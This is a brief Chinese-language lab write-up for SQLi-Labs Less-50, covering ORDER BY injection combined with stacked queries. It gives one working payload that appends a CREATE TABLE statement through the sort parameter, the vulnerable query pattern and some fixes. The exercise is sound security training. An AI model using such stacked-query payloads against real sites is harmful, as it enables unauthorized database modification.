# SQLi-Labs | Less-50 GET 排序注入 order by 堆叠注入
## 一、漏洞简介
sort拼入order by，数字型，开启multi_query，支持堆叠注入。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-50/?sort=1
注入类型：GET、order by注入、数字型、堆叠注入
## 三、复现步骤
1. sort参数拼入order by。
2. 分号堆叠执行额外SQL。
## 四、Payload
`?sort=1;create table test like users; --+`
## 五、漏洞原理
`SELECT * FROM users ORDER BY $sort`
multi_query开启，order by后堆叠SQL。
## 六、修复方案
1. 排序字段白名单，关闭multi_query，最小权限账号。
## 七、总结
Less50把order by注入和堆叠注入结合。